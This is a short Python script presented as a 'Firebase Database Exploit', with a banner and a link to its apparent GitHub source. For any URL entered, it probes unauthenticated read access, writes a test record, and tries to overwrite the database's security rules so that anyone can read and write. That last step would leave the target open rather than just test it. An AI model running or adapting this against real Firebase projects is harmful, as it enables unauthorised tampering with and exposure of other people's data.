import requests

print ("""

  _____ _          _                      _____            _       _ _   
 |  ___(_)_ __ ___| |__   __ _ ___  ___  | ____|_  ___ __ | | ___ (_) |_ 
 | |_  | | '__/ _ \ '_ \ / _` / __|/ _ \ |  _| \ \/ / '_ \| |/ _ \| | __|
 |  _| | | | |  __/ |_) | (_| \__ \  __/ | |___ >  <| |_) | | (_) | | |_ 
 |_|   |_|_|  \___|_.__/ \__,_|___/\___| |_____/_/\_\ .__/|_|\___/|_|\__|
                                                    |_|                      
Firebase Database Exploit
Command: python3 firebase_exploit
Exploit URL: https://github.com/rahadchowdhury/Firebase-Database-Exploit
Info : This is a simple python script to exploit firebase databases! 
       There you can update infromation in firebase database.
""")

def check_firebase_vulnerabilities(url):
    # Check for unauthenticated read access
    response = requests.get(url)
    if response.status_code == 200:
        print("Unauthenticated read access is possible.")
    else:
        print("Unauthenticated read access is not possible.")

    # Check for unauthenticated write access
    response = requests.put(url + "/test.json", json={"test": "test"})
    if response.status_code == 401:
        print("Unauthenticated write access is not possible.")
    else:
        print("Unauthenticated write access is possible.")

    # Check for insecure rules
    response = requests.put(url + "/.settings/rules.json", json={
        "rules": {
            ".read": "true",
            ".write": "true"
        }
    })
    if response.status_code == 200:
        print("Insecure rules can be set.")
    else:
        print("Insecure rules cannot be set.")

if __name__ == "__main__":
    url = input("Enter Firebase URL to check vulnerabilities and Exploit: ")
    check_firebase_vulnerabilities(url)
